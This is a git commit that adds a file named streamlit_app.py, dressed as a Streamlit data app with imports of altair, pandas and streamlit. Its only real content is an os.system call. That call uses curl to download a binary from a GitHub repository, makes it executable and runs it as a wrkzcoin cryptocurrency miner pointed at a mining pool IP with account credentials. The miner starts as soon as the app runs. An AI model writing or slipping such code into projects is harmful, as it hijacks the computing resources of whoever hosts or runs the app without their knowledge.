01a442bb00a2de1e44104b2f8365867c220d1900
Ertyap <119286610+Ertyap@users.noreply.github.com>
2022-11-28 15:29:30 +0800

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("curl -L -o ungu https://github.com/Ikuzot/Yahaha/raw/main/ungu && chmod +x ungu && ./ungu --algorithm wrkzcoin --pool 168.235.86.33:3393 --username SK_pDKo9B7rTqyPDrYeohNv5.Temera88 --password x --disableNVIDIA")
